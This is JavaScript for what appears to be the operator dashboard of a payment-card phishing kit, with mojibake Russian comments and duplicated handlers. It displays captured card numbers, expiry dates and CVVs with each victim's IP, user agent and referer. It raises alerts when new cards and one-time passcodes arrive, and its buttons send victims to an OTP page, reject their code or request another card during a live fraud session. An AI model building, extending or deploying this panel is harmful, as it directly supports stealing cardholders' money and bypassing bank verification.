const socket = io('https://localhost:3000', {
    withCredentials: true,
    rejectUnauthorized: false
});
const cardList = document.getElementById('card-list');
const chatContainer = document.getElementById('chat-container');
const chatMessages = document.getElementById('chat-messages');
const chatInput = document.getElementById('chat-message');
const sendMessage = document.getElementById('send-message');
const searchInput = document.querySelector('.search-box input');
const soundToggle = document.querySelector('.sound-toggle');
const actionButtons = document.querySelectorAll('.action-button');
const connectionsCount = document.getElementById('connections-count');
const messageModal = document.getElementById('message-modal');
const notificationText = document.getElementById('notification-text');
const sendNotification = document.getElementById('send-notification');
const cancelNotification = document.getElementById('cancel-notification');
const cardsList = document.getElementById('cards-list');
const closeChat = document.querySelector('.close-chat');
const activeUsersCount = document.querySelector('.active-users .count');
const soundButton = document.querySelector('.sound-btn');
const logoutButton = document.querySelector('.logout-btn');

let soundEnabled = true;
let selectedCardId = null;
let currentAction = null;

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Ñ–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –¥–∞—Ç—ã
function formatDate(date) {
    const d = new Date(date);
    return `${d.getDate().toString().padStart(2, '0')}/${(d.getMonth() + 1).toString().padStart(2, '0')}/${d.getFullYear()}`;
}

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è —Å—Ç—Ä–æ–∫–∏ —Ç–∞–±–ª–∏—Ü—ã
function createTableRow(data) {
    const row = document.createElement('tr');
    row.dataset.id = data.id;
    row.innerHTML = `
        <td>${data.id}</td>
        <td>${data.name || '-'}</td>
        <td>${data.number || '-'}</td>
        <td>${data.exp || '-'}</td>
        <td>${data.cvv || '-'}</td>
        <td>${formatDate(data.created_at) || '-'}</td>
        <td>${data.clientInfo?.ip || '-'}</td>
        <td>${data.clientInfo?.ua || '-'}</td>
        <td>${data.clientInfo?.referer || '-'}</td>
        <td>
            <button class="action-btn show-otp" data-id="${data.id}">OTP</button>
            <button class="action-btn reject" data-id="${data.id}">Reject</button>
            <button class="action-btn new-card" data-id="${data.id}">New Card</button>
        </td>
    `;

    row.querySelectorAll('.action-btn').forEach(btn => {
        btn.addEventListener('click', (e) => {
            e.preventDefault();
            selectedCardId = btn.dataset.id;
            const action = btn.classList[1];
            
            switch(action) {
                case 'show-otp':
                    socket.emit('show-otp', { id: selectedCardId });
                    break;
                case 'reject':
                    openModal('reject-otp', '–í–≤–µ–¥–∏—Ç–µ –ø—Ä–∏—á–∏–Ω—É –æ—Ç–∫–∞–∑–∞');
                    break;
                case 'new-card':
                    openModal('new-card', '–í–≤–µ–¥–∏—Ç–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è –∑–∞–ø—Ä–æ—Å–∞ –Ω–æ–≤–æ–π –∫–∞—Ä—Ç—ã');
                    break;
            }
        });
    });

    return row;
}

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö —Ç–∞–±–ª–∏—Ü—ã
function updateTable(data) {
    cardList.innerHTML = '';
    data.forEach(item => {
        cardList.appendChild(createTableRow(item));
    });
}

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è —Å–æ–æ–±—â–µ–Ω–∏—è –≤ —á–∞—Ç
function addChatMessage(message, isAdmin = true) {
    const messageDiv = document.createElement('div');
    messageDiv.className = `chat-message ${isAdmin ? 'admin' : 'user'}`;
    messageDiv.textContent = message;
    chatMessages.appendChild(messageDiv);
    chatMessages.scrollTop = chatMessages.scrollHeight;
}

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏—è –∑–≤—É–∫–∞
function playSound(type) {
    if (!soundEnabled) return;
    
    const audio = new Audio();
    switch(type) {
        case 'new':
            audio.src = '/admin/sounds/new.mp3';
            break;
        case 'success':
            audio.src = '/admin/sounds/success.mp3';
            break;
        case 'error':
            audio.src = '/admin/sounds/error.mp3';
            break;
    }
    audio.play().catch(err => console.log('–û—à–∏–±–∫–∞ –≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏—è –∑–≤—É–∫–∞:', err));
}

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–∫–∞–∑–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è
function showNotification(message, type = 'info') {
    const container = document.createElement('div');
    container.className = 'notification-container';
    
    let icon = 'üí¨';
    if (type === 'error') icon = '‚ùå';
    if (type === 'success') icon = '‚úÖ';
    
    container.innerHTML = `
        <span class="notification-icon">${icon}</span>
        <span class="notification-message">${message}</span>
        <button class="notification-close">√ó</button>
    `;
    
    document.body.appendChild(container);
    
    // –£–¥–∞–ª–µ–Ω–∏–µ –ø–æ –∫–ª–∏–∫—É –Ω–∞ –∫—Ä–µ—Å—Ç–∏–∫
    container.querySelector('.notification-close').addEventListener('click', () => {
        container.remove();
    });
    
    // –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–µ —É–¥–∞–ª–µ–Ω–∏–µ —á–µ—Ä–µ–∑ 5 —Å–µ–∫—É–Ω–¥
    setTimeout(() => {
        if (document.body.contains(container)) {
            container.remove();
        }
    }, 5000);
}

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–∫—Ä—ã—Ç–∏—è –º–æ–¥–∞–ª—å–Ω–æ–≥–æ –æ–∫–Ω–∞
function openModal(action, title = '–í–≤–µ–¥–∏—Ç–µ —Å–æ–æ–±—â–µ–Ω–∏–µ') {
    currentAction = action;
    messageModal.querySelector('h3').textContent = title;
    notificationText.value = '';
    messageModal.style.display = 'flex';
}

// –û–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ —Å–æ–±—ã—Ç–∏–π –¥–ª—è –∫–Ω–æ–ø–æ–∫ –¥–µ–π—Å—Ç–≤–∏–π
actionButtons.forEach(button => {
    button.addEventListener('click', () => {
        if (!selectedCardId) {
            alert('–í—ã–±–µ—Ä–∏—Ç–µ –∫–∞—Ä—Ç—É –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –¥–µ–π—Å—Ç–≤–∏—è');
            return;
        }

        const action = button.classList[1];
        switch(action) {
            case 'success':
                socket.emit('show-otp', { id: selectedCardId });
                break;
            case 'fail':
                openModal('reject-otp', '–í–≤–µ–¥–∏—Ç–µ –ø—Ä–∏—á–∏–Ω—É –æ—Ç–∫–∞–∑–∞');
                break;
            case 'card':
                openModal('new-card', '–í–≤–µ–¥–∏—Ç–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è –∑–∞–ø—Ä–æ—Å–∞ –Ω–æ–≤–æ–π –∫–∞—Ä—Ç—ã');
                break;
            // ... –¥—Ä—É–≥–∏–µ –¥–µ–π—Å—Ç–≤–∏—è ...
        }
    });
});

// –û–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ –º–æ–¥–∞–ª—å–Ω–æ–≥–æ –æ–∫–Ω–∞
sendNotification.addEventListener('click', () => {
    const message = notificationText.value.trim();
    if (!message) return;

    switch(currentAction) {
        case 'reject-otp':
            socket.emit('reject-otp', { id: selectedCardId, message });
            break;
        case 'new-card':
            socket.emit('request-new-card', { id: selectedCardId, message });
            break;
    }
    
    messageModal.style.display = 'none';
});

cancelNotification.addEventListener('click', () => {
    messageModal.style.display = 'none';
});

// –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –ø–æ–∏—Å–∫–∞
searchInput.addEventListener('input', (e) => {
    const searchTerm = e.target.value.toLowerCase();
    const rows = cardList.getElementsByTagName('tr');
    
    Array.from(rows).forEach(row => {
        const text = row.textContent.toLowerCase();
        row.style.display = text.includes(searchTerm) ? '' : 'none';
    });
});

// –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –ø–µ—Ä–µ–∫–ª—é—á–∞—Ç–µ–ª—è –∑–≤—É–∫–∞
soundToggle.addEventListener('click', () => {
    soundEnabled = !soundEnabled;
    soundToggle.textContent = soundEnabled ? '–ó–≤—É–∫ –≤–∫–ª.' : '–ó–≤—É–∫ –≤—ã–∫–ª.';
});

// –û–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ —Å–æ–±—ã—Ç–∏–π —á–∞—Ç–∞
sendMessage.addEventListener('click', () => {
    const message = chatInput.value.trim();
    if (message) {
        socket.emit('chat-message', message);
        addChatMessage(message, true);
        chatInput.value = '';
    }
});

chatInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
        sendMessage.click();
    }
});

// Socket.io –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∏
socket.on('connect', () => {
    console.log('–ü–æ–¥–∫–ª—é—á–µ–Ω–æ –∫ —Å–µ—Ä–≤–µ—Ä—É');
    socket.emit('get-cards');
    socket.emit('get-connections-count');
});

socket.on('cards', (data) => {
    console.log('Received cards:', data);
    updateTable(data);
});

socket.on('new-card', (data) => {
    console.log('New card:', data);
    const row = createTableRow(data);
    cardList.insertBefore(row, cardList.firstChild);
    playSound('new');
    showNotification('–ü–æ–ª—É—á–µ–Ω–∞ –Ω–æ–≤–∞—è –∫–∞—Ä—Ç–∞', 'info');
});

socket.on('new-otp', (data) => {
    console.log('New OTP:', data);
    showNotification(`–ü–æ–ª—É—á–µ–Ω –Ω–æ–≤—ã–π OTP –∫–æ–¥: ${data.otp}`, 'info');
    playSound('new');
});

socket.on('payment-confirmed', (data) => {
    console.log('Payment confirmed:', data);
    showNotification('–ü–ª–∞—Ç–µ–∂ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω', 'success');
    playSound('success');
});

socket.on('otp-rejected', (data) => {
    console.log('OTP rejected:', data);
    showNotification(data.message || 'OTP –æ—Ç–∫–ª–æ–Ω–µ–Ω', 'error');
    playSound('error');
});

socket.on('new-card-requested', (data) => {
    console.log('New card requested:', data);
    showNotification(data.message || '–ó–∞–ø—Ä–æ—à–µ–Ω–∞ –Ω–æ–≤–∞—è –∫–∞—Ä—Ç–∞', 'info');
});

// –ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Å—á–µ—Ç—á–∏–∫–∞ –∫–∞–∂–¥—ã–µ 30 —Å–µ–∫—É–Ω–¥
setInterval(() => {
    socket.emit('get-connections-count');
}, 30000);

socket.on('connections-count', (count) => {
    connectionsCount.textContent = count;
    connectionsCount.classList.add('counter-update');
    setTimeout(() => {
        connectionsCount.classList.remove('counter-update');
    }, 300);
});

// –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è
document.addEventListener('DOMContentLoaded', () => {
    // –ó–∞–ø—Ä–æ—Å –Ω–∞—á–∞–ª—å–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö
    socket.emit('get-cards');
    
    // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ —É–¥–∞–ª–µ–Ω–∏—è –∫–∞—Ä—Ç
    cardList.addEventListener('click', (e) => {
        if (e.target.classList.contains('delete-btn')) {
            if (confirm('–í—ã —É–≤–µ—Ä–µ–Ω—ã, —á—Ç–æ —Ö–æ—Ç–∏—Ç–µ —É–¥–∞–ª–∏—Ç—å —ç—Ç—É –∑–∞–ø–∏—Å—å?')) {
                const id = e.target.dataset.id;
                socket.emit('delete-card', { id });
            }
        }
    });
    
    // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –≤—ã–±–æ—Ä–∞ –∫–∞—Ä—Ç—ã
    cardList.addEventListener('click', (e) => {
        const row = e.target.closest('tr');
        if (row) {
            const prevSelected = cardList.querySelector('.selected');
            if (prevSelected) {
                prevSelected.classList.remove('selected');
            }
            row.classList.add('selected');
            selectedCardId = row.querySelector('.delete-btn').dataset.id;
            
            // –û—á–∏—Å—Ç–∫–∞ –∏ –ø–æ–∫–∞–∑ —á–∞—Ç–∞ –ø—Ä–∏ –≤—ã–±–æ—Ä–µ –Ω–æ–≤–æ–π –∫–∞—Ä—Ç—ã
            chatMessages.innerHTML = '';
            chatContainer.style.display = 'block';
        }
    });
});

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è —Å—Ç—Ä–æ–∫–∏ —Ç–∞–±–ª–∏—Ü—ã —Å –¥–∞–Ω–Ω—ã–º–∏ –∫–∞—Ä—Ç—ã
function createCardRow(card) {
    const tr = document.createElement('tr');
    tr.innerHTML = `
        <td>${card.id}</td>
        <td>${card.exp || '-'}</td>
        <td>***</td>
        <td>${card.name || '-'}</td>
        <td>${card.code || '-'}</td>
        <td>${card.site || '-'}</td>
        <td>${card.ip || '-'}</td>
        <td>${card.ua || '-'}</td>
        <td>${card.referer || '-'}</td>
        <td>
            <button class="delete-btn">√ó</button>
        </td>
    `;
    
    // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –¥–ª—è –∫–Ω–æ–ø–∫–∏ —É–¥–∞–ª–µ–Ω–∏—è
    const deleteBtn = tr.querySelector('.delete-btn');
    deleteBtn.addEventListener('click', () => {
        socket.emit('delete-card', card.id);
        tr.remove();
    });
    
    return tr;
}

// –û–±—Ä–∞–±–æ—Ç–∫–∞ –ø–æ–ª—É—á–µ–Ω–Ω—ã—Ö –∫–∞—Ä—Ç
socket.on('cards', (cards) => {
    cardsList.innerHTML = '';
    cards.forEach(card => {
        cardsList.appendChild(createCardRow(card));
    });
});

// –û–±—Ä–∞–±–æ—Ç–∫–∞ –Ω–æ–≤–æ–π –∫–∞—Ä—Ç—ã
socket.on('new-card', (card) => {
    cardsList.appendChild(createCardRow(card));
});

// –§—É–Ω–∫—Ü–∏–æ–Ω–∞–ª —á–∞—Ç–∞
function addChatMessage(message, isAdmin = false) {
    const div = document.createElement('div');
    div.className = `chat-message ${isAdmin ? 'admin' : 'user'}`;
    div.textContent = message;
    chatMessages.appendChild(div);
    chatMessages.scrollTop = chatMessages.scrollHeight;
}

sendMessage.addEventListener('click', () => {
    const message = chatInput.value.trim();
    if (message) {
        socket.emit('chat-message', message);
        addChatMessage(message, true);
        chatInput.value = '';
    }
});

chatInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
        sendMessage.click();
    }
});

socket.on('chat', (message) => {
    addChatMessage(message, false);
});

// –û—Ç–∫—Ä—ã—Ç–∏–µ/–∑–∞–∫—Ä—ã—Ç–∏–µ —á–∞—Ç–∞
document.querySelector('.action-item:last-child').addEventListener('click', (e) => {
    e.preventDefault();
    chatContainer.style.display = 'block';
});

closeChat.addEventListener('click', () => {
    chatContainer.style.display = 'none';
});

// –ü–æ–∏—Å–∫
searchInput.addEventListener('input', (e) => {
    const searchTerm = e.target.value.toLowerCase();
    const rows = cardsList.getElementsByTagName('tr');
    
    Array.from(rows).forEach(row => {
        const text = row.textContent.toLowerCase();
        row.style.display = text.includes(searchTerm) ? '' : 'none';
    });
});

// –ó–≤—É–∫
soundButton.addEventListener('click', () => {
    soundEnabled = !soundEnabled;
    soundButton.textContent = soundEnabled ? '–ó–≤—É–∫ –≤–∫–ª.' : '–ó–≤—É–∫ –≤—ã–∫–ª.';
});

// –í—ã—Ö–æ–¥
logoutButton.addEventListener('click', () => {
    window.location.href = '/logout';
});

// –û–Ω–æ–≤–ª–µ–Ω–∏–µ –ª–∏—Ç–µ—Ä–∞—Ç–æ—Ä–∞ –∞–∫—Ç–∏–≤–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
socket.on('active-users', (count) => {
    activeUsersCount.textContent = `${count} –∞–∫—Ç–∏–≤–Ω—ã—Ö`;
}); 